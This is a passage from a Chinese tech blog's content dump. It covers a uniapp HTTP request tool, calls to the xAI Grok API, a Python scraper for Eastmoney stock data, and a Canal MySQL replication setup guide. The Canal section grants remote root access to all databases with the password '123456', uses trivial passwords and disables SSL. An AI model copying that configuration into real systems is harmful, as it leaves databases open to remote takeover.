&#123; this.response = JSON.stringify(err, null, 2); &#125; &#125;); &#125; &#125;&#125;;&lt;/script&gt;&lt;style&gt;.content &#123; padding: 20px;&#125;input, textarea, button &#123; width: 100%; margin-bottom: 10px;&#125;.response &#123; background-color: #f0f0f0; padding: 10px; border-radius: 5px; overflow-x: auto;&#125;&lt;/style&gt; 添加 methods delete put，添加header ，给出修改后的代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172&lt;template&gt; &lt;view class=&quot;content&quot;&gt; &lt;input v-model=&quot;url&quot; placeholder=&quot;请输入请求地址&quot; /&gt; &lt;picker :range=&quot;methods&quot; @change=&quot;onMethodChange&quot;&gt; &lt;view&gt;&#123;&#123; methods[selectedIndex] &#125;&#125;&lt;/view&gt; &lt;/picker&gt; &lt;textarea v-model=&quot;body&quot; placeholder=&quot;请输入请求体&quot;&gt;&lt;/textarea&gt; &lt;input v-model=&quot;headers.Authorization&quot; placeholder=&quot;请输入Authorization头&quot; /&gt; &lt;input v-model=&quot;headers[&#x27;Content-Type&#x27;]&quot; placeholder=&quot;请输入Content-Type头&quot; /&gt; &lt;button @click=&quot;sendRequest&quot;&gt;发送请求&lt;/button&gt; &lt;view v-if=&quot;response&quot; class=&quot;response&quot;&gt; &lt;text&gt;响应:&lt;/text&gt; &lt;pre&gt;&#123;&#123; response &#125;&#125;&lt;/pre&gt; &lt;/view&gt; &lt;/view&gt;&lt;/template&gt;&lt;script&gt;export default &#123; data() &#123; return &#123; url: &#x27;&#x27;, body: &#x27;&#x27;, response: &#x27;&#x27;, methods: [&#x27;GET&#x27;, &#x27;POST&#x27;, &#x27;PUT&#x27;, &#x27;DELETE&#x27;], selectedIndex: 0, headers: &#123; Authorization: &#x27;&#x27;, &#x27;Content-Type&#x27;: &#x27;application/json&#x27; &#125; &#125;; &#125;, methods: &#123; onMethodChange(e) &#123; this.selectedIndex = e.detail.value; &#125;, sendRequest() &#123; const method = this.methods[this.selectedIndex]; const data = method !== &#x27;GET&#x27; ? JSON.parse(this.body) : null; uni.request(&#123; url: this.url, method: method, data: data, header: this.headers, success: (res) =&gt; &#123; this.response = JSON.stringify(res.data, null, 2); &#125;, fail: (err) =&gt; &#123; this.response = JSON.stringify(err, null, 2); &#125; &#125;); &#125; &#125;&#125;;&lt;/script&gt;&lt;style&gt;.content &#123; padding: 20px;&#125;input, textarea, button &#123; width: 100%; margin-bottom: 10px;&#125;.response &#123; background-color: #f0f0f0; padding: 10px; border-radius: 5px; overflow-x: auto;&#125;&lt;/style&gt; url：用户输入的请求地址。body：用户输入的请求体。response：服务器返回的响应内容。methods：支持的HTTP方法数组。selectedIndex：当前选中的HTTP方法索引。headers：请求头对象，包含Authorization和Content-Type。onMethodChange(e)：当用户选择不同的HTTP方法时，更新selectedIndex。sendRequest()：发送HTTP请求。根据选中的HTTP方法和请求体，调用uni.request发送请求，并处理成功和失败的回调。 添加了两个输入框，分别用于设置Authorization和Content-Type请求头。在uni.request中，通过header属性传递请求头。 动态请求头123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105&lt;template&gt; &lt;view class=&quot;content&quot;&gt; &lt;input v-model=&quot;url&quot; placeholder=&quot;请输入请求地址&quot; /&gt; &lt;picker :range=&quot;methods&quot; @change=&quot;onMethodChange&quot;&gt; &lt;view&gt;&#123;&#123; methods[selectedIndex] &#125;&#125;&lt;/view&gt; &lt;/picker&gt; &lt;textarea v-model=&quot;body&quot; placeholder=&quot;请输入请求体&quot;&gt;&lt;/textarea&gt; &lt;!-- 动态请求头输入框 --&gt; &lt;view v-for=&quot;(header, index) in headers&quot; :key=&quot;index&quot; class=&quot;header-input&quot;&gt; &lt;input v-model=&quot;header.key&quot; placeholder=&quot;键&quot; /&gt; &lt;input v-model=&quot;header.value&quot; placeholder=&quot;值&quot; /&gt; &lt;button @click=&quot;removeHeader(index)&quot;&gt;删除&lt;/button&gt; &lt;/view&gt; &lt;button @click=&quot;addHeader&quot;&gt;添加请求头&lt;/button&gt; &lt;button @click=&quot;sendRequest&quot;&gt;发送请求&lt;/button&gt; &lt;view v-if=&quot;response&quot; class=&quot;response&quot;&gt; &lt;text&gt;响应:&lt;/text&gt; &lt;pre&gt;&#123;&#123; response &#125;&#125;&lt;/pre&gt; &lt;/view&gt; &lt;/view&gt;&lt;/template&gt;&lt;script&gt;export default &#123; data() &#123; return &#123; url: &#x27;&#x27;, body: &#x27;&#x27;, response: &#x27;&#x27;, methods: [&#x27;GET&#x27;, &#x27;POST&#x27;, &#x27;PUT&#x27;, &#x27;DELETE&#x27;], selectedIndex: 0, headers: [ &#123; key: &#x27;Authorization&#x27;, value: &#x27;&#x27; &#125;, &#123; key: &#x27;Content-Type&#x27;, value: &#x27;application/json&#x27; &#125; ] &#125;; &#125;, methods: &#123; onMethodChange(e) &#123; this.selectedIndex = e.detail.value; &#125;, addHeader() &#123; this.headers.push(&#123; key: &#x27;&#x27;, value: &#x27;&#x27; &#125;); &#125;, removeHeader(index) &#123; this.headers.splice(index, 1); &#125;, sendRequest() &#123; const method = this.methods[this.selectedIndex]; const data = method !== &#x27;GET&#x27; ? JSON.parse(this.body) : null; // 将headers对象转换为uni.request所需的格式 const requestHeaders = this.headers.reduce((acc, header) =&gt; &#123; if (header.key &amp;&amp; header.value) &#123; acc[header.key] = header.value; &#125; return acc; &#125;, &#123;&#125;); uni.request(&#123; url: this.url, method: method, data: data, header: requestHeaders, success: (res) =&gt; &#123; this.response = JSON.stringify(res.data, null, 2); &#125;, fail: (err) =&gt; &#123; this.response = JSON.stringify(err, null, 2); &#125; &#125;); &#125; &#125;&#125;;&lt;/script&gt;&lt;style&gt;.content &#123; padding: 20px;&#125;input, textarea, button &#123; width: 100%; margin-bottom: 10px;&#125;.header-input &#123; display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px;&#125;.header-input input &#123; width: 45%;&#125;.header-input button &#123; width: 10%;&#125;.response &#123; background-color: #f0f0f0; padding: 10px; border-radius: 5px; overflow-x: auto;&#125; 使用v-for指令遍历headers数组，为每个请求头生成一对输入框和一个删除按钮。提供一个“添加请求头”按钮，允许用户动态添加新的请求头输入框。 长按复制结果12345&lt;view v-if=&quot;response&quot; class=&quot;response&quot; @longpress=&quot;copyResponse&quot;&gt; &lt;text&gt;响应:&lt;/text&gt; &lt;pre&gt;&#123;&#123; response &#125;&#125;&lt;/pre&gt;&lt;/view&gt; 1234567891011121314151617181920212223242526272829 copyResponse() &#123; uni.setClipboardData(&#123; data: this.response, success: () =&gt; &#123; uni.showToast(&#123; title: &#x27;复制成功&#x27;, icon: &#x27;success&#x27; &#125;); &#125;, fail: () =&gt; &#123; uni.showToast(&#123; title: &#x27;复制失败&#x27;, icon: &#x27;none&#x27; &#125;); &#125; &#125;); &#125;&lt;style&gt;.response &#123; background-color: #f0f0f0; padding: 10px; border-radius: 5px; overflow-x: auto; white-space: pre-wrap; /* 使文本换行显示 */&#125;&lt;/style&gt; 。","categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"uniapp","slug":"uniapp","permalink":"https://banjinmei.github.io/tags/uniapp/"},{"name":"postman","slug":"postman","permalink":"https://banjinmei.github.io/tags/postman/"}],"author":"mu"},{"title":"XAI Grok","slug":"XAI","date":"2024-11-19T14:54:15.000Z","updated":"2024-11-19T15:02:20.333Z","comments":true,"path":"2024/11/19/XAI/","permalink":"https://banjinmei.github.io/2024/11/19/XAI/","excerpt":"","text":"X.AIReg Create API key123456789101112131415curl https://api.x.ai/v1/chat/completions -H &quot;Content-Type: application/json&quot; -H &quot;Authorization: Bearer xai-xxx&quot; -d &#x27;&#123; &quot;messages&quot;: [ &#123; &quot;role&quot;: &quot;system&quot;, &quot;content&quot;: &quot;You are a test assistant.&quot; &#125;, &#123; &quot;role&quot;: &quot;user&quot;, &quot;content&quot;: &quot;what can u do?&quot; &#125; ], &quot;model&quot;: &quot;grok-beta&quot;, &quot;stream&quot;: false, &quot;temperature&quot;: 0&#125;&#x27; python12345678910111213141516171819202122232425262728293031323334353637383940414243444546import requests# API URL 和 API 密钥API_URL = &quot;https://api.x.ai/v1/chat/completions&quot;API_KEY = &quot;xai-bELnXX&quot; # 替换为实际 API 密钥# 请求头headers = &#123; &quot;Content-Type&quot;: &quot;application/json&quot;, &quot;Authorization&quot;: f&quot;Bearer &#123;API_KEY&#125;&quot;&#125;# 请求数据data = &#123; &quot;messages&quot;: [ &#123; &quot;role&quot;: &quot;system&quot;, &quot;content&quot;: &quot;You are a test assistant.&quot; &#125;, &#123; &quot;role&quot;: &quot;user&quot;, &quot;content&quot;: &quot;what can u do?&quot; &#125; ], &quot;model&quot;: &quot;grok-beta&quot;, &quot;stream&quot;: False, &quot;temperature&quot;: 0&#125;try: response = requests.post(API_URL, headers=headers, json=data) response.raise_for_status() # 确保状态码为 200 result = response.json() # 解析响应 # print(&quot;API 响应：&quot;, result) # 提取内容 if &#x27;choices&#x27; in result and result[&#x27;choices&#x27;]: content = result[&#x27;choices&#x27;][0][&#x27;message&#x27;][&#x27;content&#x27;] print(&quot;XAI回答：\\n&quot;) print(content) else: print(&quot;XAI的回答。&quot;)except requests.exceptions.HTTPError as e: print(&quot;HTTP 错误：&quot;, e) print(&quot;响应内容：&quot;, response.text) # 输出详细的错误信息except requests.exceptions.RequestException as e: print(&quot;请求失败：&quot;, e)","categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"XAI","slug":"XAI","permalink":"https://banjinmei.github.io/tags/XAI/"},{"name":"Grok","slug":"Grok","permalink":"https://banjinmei.github.io/tags/Grok/"}],"author":"mu"},{"title":"Python股票爬虫","slug":"Python股票爬虫","date":"2024-11-19T14:07:04.000Z","updated":"2024-11-19T14:52:46.309Z","comments":true,"path":"2024/11/19/Python股票爬虫/","permalink":"https://banjinmei.github.io/2024/11/19/Python%E8%82%A1%E7%A5%A8%E7%88%AC%E8%99%AB/","excerpt":"","text":"功能概况：根据股票代码，采集指定日期连续N个交易日数据，输出保存为xls数据表。 详细说明:变量为股票代码、指定日期、N个交易日，变量以xls表格形式给出，爬虫根据股票代码，逐条爬取交易数据(字段为日期、开盘价、收盘价、最高价、最低价，涨跌幅、成交量、成交额、振幅，换手率等），并输出保存到xls中。采集来源 东方财富网 安装了必要的库1pip install requests pandas openpyxl 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071import requestsimport pandas as pdfrom datetime import datetime, timedeltadef get_stock_data(stock_code, start_date, days): # 将输入的字符串日期转换为datetime对象 start_date = datetime.strptime(start_date, &#x27;%Y-%m-%d&#x27;) end_date = start_date + timedelta(days=days) # 构建请求URL url = f&quot;http://push2his.eastmoney.com/api/qt/stock/kline/get?secid=&#123;stock_code&#125;&amp;fields1=f1,f2,f3,f4,f5&amp;fields2=f51,f52,f53,f54,f55,f56,f57,f58,f59,f60,f61&amp;klt=101&amp;fqt=0&amp;beg=&#123;start_date.strftime(&#x27;%Y%m%d&#x27;)&#125;&amp;end=&#123;end_date.strftime(&#x27;%Y%m%d&#x27;)&#125;&quot; headers = &#123; &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3&#x27; &#125; response = requests.get(url, headers=headers) # 检查响应状态码 if response.status_code != 200: raise Exception(f&quot;Request failed with status code &#123;response.status_code&#125;&quot;) data = response.json() # 打印响应内容，以便调试 print(&quot;Response content:&quot;) print(data) if &#x27;rc&#x27; not in data or data[&#x27;rc&#x27;] != 0: raise Exception(f&quot;Error fetching data: &#123;data.get(&#x27;rt&#x27;, &#x27;Unknown error&#x27;)&#125;&quot;) klines = data[&#x27;data&#x27;][&#x27;klines&#x27;] # 解析数据 records = [] for line in klines: parts = line.split(&#x27;,&#x27;) record = &#123; &#x27;日期&#x27;: parts[0], &#x27;开盘价&#x27;: float(parts[1]), &#x27;收盘价&#x27;: float(parts[2]), &#x27;最高价&#x27;: float(parts[3]), &#x27;最低价&#x27;: float(parts[4]), &#x27;涨跌幅&#x27;: float(parts[8]), &#x27;成交量&#x27;: int(parts[5]), &#x27;成交额&#x27;: float(parts[6]), &#x27;振幅&#x27;: float(parts[9]), &#x27;换手率&#x27;: float(parts[10]) &#125; records.append(record) df = pd.DataFrame(records) return dfdef save_to_excel(df, filename): df.to_excel(filename, index=False)if __name__ == &quot;__main__&quot;: stock_code = &quot;1.600519&quot; # 示例股票代码，前缀1表示上海A股 start_date = &quot;2024-10-01&quot; days = 30 # 获取30个交易日的数据 try: df = get_stock_data(stock_code, start_date, days) save_to_excel(df, &quot;stock_data.xlsx&quot;) print(&quot;Data saved to stock_data.xlsx&quot;) except Exception as e: print(f&quot;Error: &#123;e&#125;&quot;) 加入 港股 代码自动识别股票市场：根据股票代码的长度判断是港股还是大陆股票。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293import requestsimport pandas as pdfrom datetime import datetime, timedeltaimport timeimport calendardef is_weekend(date_str): year, month, day = map(int, date_str.split(&#x27;-&#x27;)) return calendar.weekday(year, month, day) &gt;= 5 # 5是周六，6是周日def get_stock_data(stock_code, start_date, days, retries=3, delay=1): # 将输入的字符串日期转换为datetime对象 start_date = datetime.strptime(start_date, &#x27;%Y-%m-%d&#x27;) end_date = start_date + timedelta(days=days) # 根据股票代码长度识别市场 if len(stock_code) == 5: market = &#x27;HK&#x27; secid = f&quot;116.&#123;stock_code&#125;&quot; # 东方财富网港股代码前缀 elif len(stock_code) == 6: market = &#x27;SH&#x27; if stock_code.startswith(&#x27;6&#x27;) else &#x27;SZ&#x27; secid = f&quot;&#123;market&#125;.&#123;stock_code&#125;&quot; else: raise ValueError(&quot;Invalid stock code length. Stock code should be 5 digits for HK stocks and 6 digits for mainland stocks.&quot;) # 构建请求URL url = f&quot;http://push2his.eastmoney.com/api/qt/stock/kline/get?secid=&#123;secid&#125;&amp;fields1=f1,f2,f3,f4,f5&amp;fields2=f51,f52,f53,f54,f55,f56,f57,f58,f59,f60,f61&amp;klt=101&amp;fqt=0&amp;beg=&#123;start_date.strftime(&#x27;%Y%m%d&#x27;)&#125;&amp;end=&#123;end_date.strftime(&#x27;%Y%m%d&#x27;)&#125;&quot; headers = &#123; &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3&#x27; &#125; for attempt in range(retries): response = requests.get(url, headers=headers) # 检查响应状态码 if response.status_code != 200: if attempt &lt; retries - 1: time.sleep(delay) continue else: raise Exception(f&quot;Request failed with status code &#123;response.status_code&#125;&quot;) data = response.json() # 打印响应内容，以便调试 print(&quot;Response content:&quot;) print(data) if &#x27;rc&#x27; not in data or data[&#x27;rc&#x27;] != 0: if attempt &lt; retries - 1: time.sleep(delay) continue else: raise Exception(f&quot;Error fetching data: &#123;data.get(&#x27;rt&#x27;, &#x27;Unknown error&#x27;)&#125;&quot;) klines = data[&#x27;data&#x27;][&#x27;klines&#x27;] # 解析数据 records = [] for line in klines: parts = line.split(&#x27;,&#x27;) record = &#123; &#x27;日期&#x27;: parts[0], &#x27;开盘价&#x27;: float(parts[1]), &#x27;收盘价&#x27;: float(parts[2]), &#x27;最高价&#x27;: float(parts[3]), &#x27;最低价&#x27;: float(parts[4]), &#x27;涨跌幅&#x27;: float(parts[8]), &#x27;成交量&#x27;: int(parts[5]), &#x27;成交额&#x27;: float(parts[6]), &#x27;振幅&#x27;: float(parts[9]), &#x27;换手率&#x27;: float(parts[10]) &#125; records.append(record) df = pd.DataFrame(records) return dfdef save_to_excel(df, filename): df.to_excel(filename, index=False)if __name__ == &quot;__main__&quot;: stock_code = &quot;09999&quot; # 示例股票代码，五位表示港股 start_date = &quot;2024-10-01&quot; days = 30 # 获取30个交易日的数据 try: df = get_stock_data(stock_code, start_date, days, retries=5, delay=2) save_to_excel(df, &quot;%s_%s_%d.xlsx&quot; % (stock_code, start_date,days)) print(&quot;Data saved to &quot;+&quot;%s_%s_%d.xlsx&quot; % (stock_code, start_date,days) ) except Exception as e: print(f&quot;Error: &#123;e&#125;&quot;)","categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"python","slug":"python","permalink":"https://banjinmei.github.io/tags/python/"}],"author":"mu"},{"title":"canal mysql auto bak","slug":"canal-mysql-auto-bak","date":"2024-11-17T15:28:55.000Z","updated":"2024-11-21T13:08:16.265Z","comments":true,"path":"2024/11/17/canal-mysql-auto-bak/","permalink":"https://banjinmei.github.io/2024/11/17/canal-mysql-auto-bak/","excerpt":"","text":"Canal是阿里巴巴开源的一个数据库binlog解析工具，它能够捕获并解析MySQL等数据库的增量数据变化（即binlog），然后将这些变化的数据以消息的形式发送给其他系统或服务，如Elasticsearch、HBase、Redis等。这样做的好处是可以实现数据的实时同步，保证不同存储系统之间的数据一致性。 Canal的设计理念主要是基于数据库的增量订阅与消费模式，它通过模拟MySQL的slave来实现对MySQL主库binlog的监听，当主库有数据更新时，Canal能及时捕捉到这些变化，并将变化的数据按照一定的格式输出，供下游系统消费使用。 使用Canal的主要优势包括：实时性Canal通过模仿MySQL的slave节点行为，向MySQL master节点发送dump协议请求，以获取binlog日志8。这种方法使得Canal能够以较低的延迟捕获到数据库的变化，从而实现实时的数据同步。对于需要保持数据最新性的应用场景，如搜索引擎的索引更新或缓存系统的数据刷新，这一特性尤为重要。 解耦Canal作为一个独立的服务，充当了数据库和数据消费者之间的中介角色。它不仅减少了直接连接数据库带来的性能压力，还避免了因数据库结构或数据模型变更导致的下游系统适配问题。这种解耦机制增强了系统的灵活性和可维护性，使得各个组件可以独立发展而不相互干扰18。 灵活性Canal支持多种数据输出格式，包括但不限于JSON、XML等，这使得它可以很容易地与其他数据处理工具和服务集成。此外，Canal还提供了对Kafka、RocketMQ等消息队列的支持，这意味着数据不仅可以被同步到不同的存储系统，还可以被发送到消息队列中，供更多的应用和服务消费14。 除了上述提到的优点外，Canal还具备以下特点： 高性能：经过优化的Canal能够在高并发环境下保持稳定的性能表现，适合大规模数据同步场景。低延迟：通过高效的日志解析和数据传输机制，Canal能够确保数据从源头到目的地的传输延迟尽可能低。高可用性：Canal支持集群部署，结合Zookeeper等协调服务，可以实现故障自动切换，保证服务的连续性和稳定性21。安全性：Canal可以通过配置SSL&#x2F;TLS加密通信，保护数据在传输过程中的安全18。 应用场景Canal的应用场景非常广泛，包括但不限于： 数据同步：将MySQL数据库的数据同步到Elasticsearch、Redis等其他存储系统，用于构建搜索引擎、缓存层等18。数据备份：定期或实时备份MySQL数据库的数据，用于灾难恢复或数据归档18。数据集成：在微服务架构中，使用Canal将多个数据库中的数据进行集成，提供统一的数据视图18。数据监控：通过监听数据库的变化，及时发现异常操作或潜在的安全风险18。Canal是一个功能强大、灵活多变的数据同步工具，它在保证数据实时性和一致性的基础上，提供了丰富的特性和广泛的应用场景，是现代数据驱动应用的理想选择。 Canal环境准备设置MySQL远程访问 12grant all privileges on *.* to &#x27;root&#x27;@&#x27;%&#x27; identified by &#x27;123456&#x27;;flush privileges; MySQL配置 Canal的原理基于MySQL binlog技术，所以，要想使用Canal就要开启MySQL的binlog写入功能，建议配置binlog的模式为row。 可以在MySQL命令行输入如下命令来查看binlog的模式。 1SHOW VARIABLES LIKE &#x27;binlog_format&#x27;; 如果MySQL中默认的binlog格式为STATEMENT，需要将STATEMENT修改为ROW。修改&#x2F;etc&#x2F;my.cnf文件。 &#x2F;etc&#x2F;my.cnf在[mysqld]下面新增如下三项配置。 123log-bin=mysql-bin #开启MySQL二进制日志binlog_format=ROW #将二进制日志的格式设置为ROWserver_id=1 #server_id需要唯一，不能与Canal的slaveId重复 修改完my.cnf文件后，需要重启MySQL服务。 1service mysqld restart 再次查看binlog模式。 1SHOW VARIABLES LIKE &#x27;binlog_format&#x27;; MySQL创建用户授权 Canal的原理是模式自己为MySQL Slave，所以一定要设置MySQL Slave的相关权限。这里，需要创建一个主从同步的账户，并且赋予这个账户相关的权限。 123CREATE USER canal@&#x27;localhost&#x27; IDENTIFIED BY &#x27;canal&#x27;;GRANT SELECT, REPLICATION SLAVE, REPLICATION CLIENT ON *.* TO &#x27;canal&#x27;@&#x27;localhost&#x27;;FLUSH PRIVILEGES; 服务器信息124.219.119.2xx 主库所在服务器 192.168.80.203 canal数据同步所在服务器 连接主库所在服务器切换 root 账号su root 启动MySQL8.0数据库systemctl start mysqld.service 创建复制账号和密码连接主库所在服务器，即：192.168.91.131，运行MySQL 8.0数据库，创建复制账号和密码，命令如下： 123mysql&gt; CREATE USER canal IDENTIFIED BY &#x27;canal&#x27;; mysql&gt; GRANT SELECT, SHOW VIEW, REPLICATION SLAVE, REPLICATION CLIENT ON *.* TO &#x27;canal&#x27;@&#x27;%&#x27;;mysql&gt; FLUSH PRIVILEGES; canal数据同步服务器操作创建canal文件夹1234cd /usr/localmkdir canalcd canalmkdir canal-package canal-adapter canal-deployer 安装canal deployer和canal adapter1234cd canal-packagewget https://github.com/alibaba/canal/releases/download/canal-1.1.8canal.deployer-1.1.8.tar.gzwget https://github.com/alibaba/canal/releases/download/canal-1.1.8/canal.adapter-1.1.8.tar.gz tar -zxvf canal.adapter.tar.gz -C &#x2F;usr&#x2F;local&#x2F;canal&#x2F;canal-adaptertar -zxvf canal.deployer.tar.gz -C &#x2F;usr&#x2F;local&#x2F;canal&#x2F;canal-deployer github:https://github.com/alibaba/canal/releases?page=1 配置和启动canal-deployer配置canal-deployer由于此次同步为MySQL数据库间的数据同步，所以此处不需要修改 canal.properties 配置文件，只需修改 instance.properties 即可 12cd /usr/local/canal/canal-deployer/conf/examplevi instance.properties 12345678910# position infocanal.instance.master.address= xxx# username/passwordcanal.instance.dbUsername=rootcanal.instance.dbPassword=123123# table regexcanal.instance.filter.regex=.*\\\\..* 说明 canal.id：设置Canal实例的唯一ID，建议使用UUID。 canal.ip：设置Canal实例的IP地址。 canal.port：设置Canal实例的端口号。 canal.destinations：设置Canal实例要连接的目标数据库地址和端口号，格式为&lt;协议：&#x2F;&#x2F;用户名：密码@IP地址：端口号&#x2F;数据库名。 canal.username：设置连接目标数据库的用户名。 canal.password：设置连接目标数据库的密码。 canal.driverClassName：设置连接目标数据库的驱动类名，例如oracle.jdbc.driver.OracleDriver。 canal.connectionCharset：设置连接目标数据库的字符集，例如UTF8。 可能遇到的问题：canal-deployer启动之后，如果在 logs 文件夹下没有 example 文件，参考如下情况说明： 查看 &#x2F;usr&#x2F;local&#x2F;canal&#x2F;canal-deployer&#x2F;bin 文件夹下，是否存在以hs_err_pid开头的文件。出现hs_err_pid开头的文件，主要原因有两个：1&gt; 服务器内存不足，导致服务启动失败，出现OOM问题，这时需要增加服务器内存2&gt; 服务器打开的线程数达到上限，这时需要修改线程上限，操作如下：vi &#x2F;etc&#x2F;security&#x2F;limits.conf 修改内容可参考下面配置： soft nproc 102400 hard nofile 102400 上述配置参数说明：第一列：linux系统用户名，*代表所有用户第二列：软连接&#x2F;硬连接第三列：类型，nproc 进程的数量&#x2F;nofile 文件打开数&#x2F;core-core 文件大小第四列：数量 bin文件夹下不存在以hs_err_pid开头的文件，查看logs文件夹下的canal文件夹下的canal_stdout.log文件，命令如下：cat &#x2F;usr&#x2F;local&#x2F;canal&#x2F;canal-deployer&#x2F;logs&#x2F;canal&#x2F;canal_stdout.log 若出现如下报错信息： OpenJDK 64-Bit Server VM warning: Ignoring option PermSize; support was removed in 8.0OpenJDK 64-Bit Server VM warning: Ignoring option MaxPermSize; support was removed in 8.0OpenJDK 64-Bit Server VM warning: Option UseConcMarkSweepGC was deprecated in version 9.0 and will likely be removed in a future release. Unrecognized VM option ‘UseCMSCompactAtFullCollection’Error: Could not create the Java Virtual Machine.Error: A fatal exception has occurred. Program will exit. 出现此报错的原因是由于当前服务器安装的jdk版本高于jdk8，此时需要修改 startup.sh 的启动参数，操作如下： cd &#x2F;usr&#x2F;local&#x2F;canal&#x2F;canal-deployer&#x2F;bin.&#x2F;stop.shvi startup.sh 删除 -XX:+UseCMSCompactAtFullCollection -XX:+UseFastAccessorMethods 参数.&#x2F;startup.sh Unrecognized VM option ‘UseBiasedLocking’Error: Could not create the Java Virtual Machine.Error: A fatal exception has occurred. Program will exit. 移除 UseBiasedLocking 选项-XX:+UseBiasedLocking Unrecognized VM option ‘AggressiveOpts’Error: Could not create the Java Virtual Machine.Error: A fatal exception has occurred. Program will exit. Remove -XX:+AggressiveOptscanal.deployer-1.1.8-SNAPSHOT.tar.gz com.alibaba.druid.pool.DruidDataSource 类未找到，导致 Canal 的 dataSource bean 初始化失败。 .&#x2F;startup.sh 若需要同步某几张表，可以参考如下配置同步某数据库test1下的user表,test2数据库下的所有表，所有库下所有表数据1canal.instance.filter.regex=test1.user,test2\\\\..*,.*\\\\..* 启动canal-deployer12cd /usr/local/canal/canal-deployer/bin./startup.sh 查看日志确定是否启动成功 12cd /usr/local/canal/canal-deployer/logs/examplecat example.log log内容… [main] INFO c.a.otter.canal.instance.core.AbstractCanalInstance - stop CannalInstance for null-example [main] INFO c.a.otter.canal.instance.core.AbstractCanalInstance - stop successful….启动 启动canal需要jdk安装 OpenJDK 1234567sudo apt updateapt search openjdksudo apt install openjdk-17-jdksudo apt install -y openjdk-17-jdk 手动下载并安装前往 Oracle JDK 下载页面，下载最新的 .tar.gz 包。https://www.oracle.com/java/technologies/downloads/?er=221886下载完成后，解压缩文件： 1tar -xvzf jdk-&lt;version&gt;-linux-x64_bin.tar.gz 将 JDK 移动到 &#x2F;opt 目录： 1sudo mv jdk-&lt;version&gt; /opt/ 配置环境变量。在 ~&#x2F;.bashrc 中添加以下内容： 12export JAVA_HOME=/opt/jdk-&lt;version&gt;export PATH=$JAVA_HOME/bin:$PATH 使配置生效： 1source ~/.bashrc 验证安装,确认安装成功，检查 Java 版本： 1java -version 卸载jdk 1dpkg --list | grep -i jdk 一旦知道了要卸载的JDK包的确切名称，使用apt-get命令卸载它： 1sudo apt-get remove your-jdk-package-name 将your-jdk-package-name替换为从列表中找到的实际JDK包名称。如果想同时删除配置文件，可以使用–purge选项： 1sudo apt-get purge your-jdk-package-name 最后，运行autoremove来清除系统中不再需要的依赖项： 1sudo apt-get autoremove 例如，如果安装的是OpenJDK 11，并且通过apt安装，可以使用以下命令来卸载： 12sudo apt-get remove openjdk-11-jdksudo apt-get autoremove canal-deployer 和 canal-adapter 是 Canal 的两个独立模块，各自承担不同的功能：canal-deployer功能：canal-deployer 是 Canal 的核心组件，用于从 MySQL 数据库中读取 binlog，并解析 binlog 事件。作用：主要负责数据的实时捕获和解析。它将从 MySQL 实例捕获的 binlog 数据转换成 Canal 可以处理的格式，并通过网络或其他方式将这些数据推送给下游消费者。配置：canal-deployer 需要配置连接信息（如 MySQL 的地址、用户名、密码等）以及相关的过滤条件，比如要监控的表和过滤的字段。应用场景：适用于需要捕获 MySQL 数据变更的场景，比如数据库的实时增量数据同步和数据监控。 canal-adapter功能：canal-adapter 负责将 Canal 捕获并解析的数据，适配并同步到不同的下游目标。作用：可以将数据写入到 ElasticSearch、Kafka、HBase 等多种目标，起到数据同步的桥梁作用。配置：canal-adapter 提供了丰富的适配器配置（如 ES、Kafka、RocketMQ 等），可以根据业务需求配置同步的字段映射、数据转换和过滤规则。应用场景：适用于需要将 MySQL 的 binlog 数据实时同步到其他数据存储或消息队列的场景，比如数据仓库同步、实时索引等。 总结canal-deployer 专注于从 MySQL 读取并解析 binlog 数据。canal-adapter 则将解析后的数据推送或同步到下游目标，起到数据适配和转换的作用。 配置和启动canal-adapter配置canal-adapter 修改application.yml文件 12cd /usr/local/canal/canal-adapter/confvi application.yml 123# canal tcp consumer# 修改位置：Canal deployer所在主机IPcanal.tcp.server.host: 192.168.91.135:11111 修改位置：添加源库配置信息，此处为同步同库下所有表信息 123456789101112131415161718srcDataSources: defaultDS: url: jdbc:mysql://124.219.119.xxx:3306/IMDB?useUnicode=true&amp;characterEncoding=utf8mb4&amp;autoReconnect=true&amp;useSSL=false username: root password: 123123.xxcanalAdapters:- instance: example # canal instance Name or mq topic name groups: - groupId: g1 outerAdapters: - name: logger - name: rdb key: mysql1 properties: jdbc.driverClassName: com.mysql.jdbc.Driver jdbc.url: jdbc:mysql://192.168.80.xxx/IMDB?useUnicode=true&amp;characterEncoding=utf8mb4&amp;autoReconnect=true&amp;useSSL=false jdbc.username: root jdbc.password: 123123.xx 说明: 其中 outAdapter 的配置: name统一为rdb, key为对应的数据源的唯一标识需和下面的表映射文件中的outerAdapterKey对应, properties为目标库jdbc的相关参数 adapter将会自动加载 conf&#x2F;rdb 下的所有.yml结尾的表映射配置文件 修改canal-adapter&#x2F;conf&#x2F;rdb文件夹下的yml文件说明：canal-adapter&#x2F;conf&#x2F;rdb文件夹下的yml文件可以同步数据库下的一张表，也可以同步数据库下的所有表(此处的前提是：同步数据的数据库与主库的schema一致) 1234567891011121314cd /usr/local/canal/canal-adapter/conf/rdb.yml## Mirror schema synchronize configdataSourceKey: defaultDSdestination: examplegroupId: g1outerAdapterKey: mysql1concurrent: truedbMapping: mirrorDb: true database: test 启动canal-adapter12cd /usr/local/canal/canal-adapter/bin./startup.sh 查看日志信息，确保正常启动。 12cd /usr/local/canal/canal-adapter/logs/adaptercat adapter.log log err[main] ERROR org.springframework.boot.SpringApplication - Application run failedorg.yaml.snakeyaml.error.YAMLException: 如果没有log 或启动不成功 